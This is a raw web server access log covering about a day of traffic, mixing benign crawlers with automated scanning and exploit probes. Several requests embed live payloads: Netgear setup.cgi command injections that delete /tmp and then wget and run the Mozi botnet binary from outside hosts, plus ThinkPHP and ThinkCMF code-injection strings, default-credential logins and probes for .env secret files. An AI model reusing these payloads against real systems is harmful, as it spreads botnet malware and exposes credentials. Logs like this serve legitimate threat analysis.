83.97.20.29 - - [17/Oct/2020:08:09:29 +0000] "GET / HTTP/1.0" 200 11192 "-" "-"
193.194.87.215 - - [17/Oct/2020:09:40:48 +0000] "GET /.env HTTP/1.1" 404 489 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.194.87.215 - - [17/Oct/2020:09:40:48 +0000] "POST / HTTP/1.1" 200 3477 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
157.230.216.203 - - [17/Oct/2020:10:38:01 +0000] "GET /requested.html HTTP/1.1" 404 433 "-" "-"
157.230.216.203 - - [17/Oct/2020:10:38:01 +0000] "GET / HTTP/1.1" 200 11173 "-" "Mozilla/0 (Project 25499 Scanner)"
157.230.216.203 - - [17/Oct/2020:10:38:01 +0000] "GET /ab2h HTTP/1.1" 404 433 "-" "Mozilla/0 (Project 25499 Scanner)"
157.230.216.203 - - [17/Oct/2020:10:38:01 +0000] "GET /ab2g HTTP/1.1" 404 433 "-" "Mozilla/0 (Project 25499 Scanner)"
203.243.137.50 - - [17/Oct/2020:10:54:45 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://203.243.137.50:4083/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 470 "-" "-"
222.138.118.2 - - [17/Oct/2020:10:58:16 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 470 "-" "-"
193.118.53.194 - - [17/Oct/2020:11:28:37 +0000] "GET / HTTP/1.1" 200 3421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
41.86.5.164 - - [17/Oct/2020:11:37:28 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://41.86.5.164:40901/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 470 "-" "-"
71.6.199.23 - - [17/Oct/2020:11:43:46 +0000] "GET / HTTP/1.1" 200 11173 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
71.6.199.23 - - [17/Oct/2020:11:43:46 +0000] "GET /robots.txt HTTP/1.1" 404 433 "-" "-"
71.6.199.23 - - [17/Oct/2020:11:43:46 +0000] "GET /sitemap.xml HTTP/1.1" 404 433 "-" "-"
71.6.199.23 - - [17/Oct/2020:11:43:46 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 433 "-" "-"
71.6.199.23 - - [17/Oct/2020:11:43:47 +0000] "GET /favicon.ico HTTP/1.1" 404 489 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
27.194.158.222 - - [17/Oct/2020:11:51:00 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 0 "-" "-"
167.71.87.43 - - [17/Oct/2020:14:21:12 +0000] "GET /.env HTTP/1.1" 404 489 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.71.87.43 - - [17/Oct/2020:14:21:12 +0000] "POST / HTTP/1.1" 200 3477 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.231.154.50 - - [17/Oct/2020:15:07:42 +0000] "GET /.env HTTP/1.1" 404 489 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.231.154.50 - - [17/Oct/2020:15:07:42 +0000] "GET /vendor/.env HTTP/1.1" 404 489 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.231.154.50 - - [17/Oct/2020:15:07:43 +0000] "GET /storage/.env HTTP/1.1" 404 489 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.231.154.50 - - [17/Oct/2020:15:07:43 +0000] "GET /public/.env HTTP/1.1" 404 489 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.231.154.50 - - [17/Oct/2020:15:07:43 +0000] "POST / HTTP/1.1" 200 3477 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
61.219.11.153 - - [17/Oct/2020:18:15:32 +0000] "-" 408 0 "-" "-"
14.54.236.217 - - [17/Oct/2020:19:59:46 +0000] "GET /index.php HTTP/1.1" 404 489 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
14.54.236.217 - - [17/Oct/2020:19:59:46 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
103.97.208.77 - - [17/Oct/2020:21:07:03 +0000] "GET /index.php HTTP/1.1" 404 489 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
103.97.208.77 - - [17/Oct/2020:21:07:03 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
209.17.96.130 - - [17/Oct/2020:21:13:09 +0000] "GET / HTTP/1.1" 200 11173 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
209.17.96.66 - - [18/Oct/2020:02:28:10 +0000] "GET / HTTP/1.0" 200 11192 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
85.132.3.30 - - [18/Oct/2020:02:52:35 +0000] "GET /manager/html HTTP/1.1" 404 489 "-" "User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705"
85.132.3.30 - - [18/Oct/2020:02:52:35 +0000] "\x16\x03\x01" 400 0 "-" "-"
85.132.3.30 - - [18/Oct/2020:02:52:35 +0000] "\x16\x03\x01" 400 0 "-" "-"
190.2.133.230 - - [18/Oct/2020:03:43:51 +0000] "GET /.env HTTP/1.1" 404 489 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
190.2.133.230 - - [18/Oct/2020:03:43:52 +0000] "POST / HTTP/1.1" 200 3477 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
71.6.232.2 - - [18/Oct/2020:05:26:22 +0000] "GET / HTTP/1.1" 200 3421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
162.243.128.102 - - [18/Oct/2020:07:43:59 +0000] "GET /hudson HTTP/1.1" 404 433 "-" "Mozilla/5.0 zgrab/0.x"
39.74.74.157 - - [18/Oct/2020:07:52:51 +0000] "POST /HNAP1/ HTTP/1.0" 408 483 "-" "-"
5.188.210.227 - - [18/Oct/2020:07:59:52 +0000] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 455 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
74.120.14.35 - - [18/Oct/2020:08:17:56 +0000] "GET / HTTP/1.1" 200 11173 "-" "-"
74.120.14.35 - - [18/Oct/2020:08:17:56 +0000] "GET / HTTP/1.1" 200 3421 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
202.83.45.94 - - [18/Oct/2020:09:28:50 +0000] "POST /HNAP1/ HTTP/1.0" 408 483 "-" "-"
3.137.158.36 - - [18/Oct/2020:10:41:20 +0000] "GET /.env HTTP/1.1" 404 489 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
3.137.158.36 - - [18/Oct/2020:10:41:20 +0000] "POST / HTTP/1.1" 200 3477 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.27.228.27 - - [18/Oct/2020:10:49:42 +0000] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 452 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.27.228.27 - - [18/Oct/2020:10:49:53 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 452 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
167.248.133.36 - - [18/Oct/2020:10:51:07 +0000] "GET / HTTP/1.1" 200 11173 "-" "-"
167.248.133.36 - - [18/Oct/2020:10:51:07 +0000] "GET / HTTP/1.1" 200 3421 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
193.27.228.27 - - [18/Oct/2020:11:02:03 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 3440 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.27.228.27 - - [18/Oct/2020:11:15:06 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 3440 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.27.228.27 - - [18/Oct/2020:11:22:37 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1" 404 452 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.27.228.27 - - [18/Oct/2020:13:49:05 +0000] "POST /api/jsonws/invoke HTTP/1.1" 404 452 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
167.248.133.52 - - [18/Oct/2020:13:50:35 +0000] "GET / HTTP/1.1" 200 11173 "-" "-"
167.248.133.52 - - [18/Oct/2020:13:50:35 +0000] "GET / HTTP/1.1" 200 3421 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"

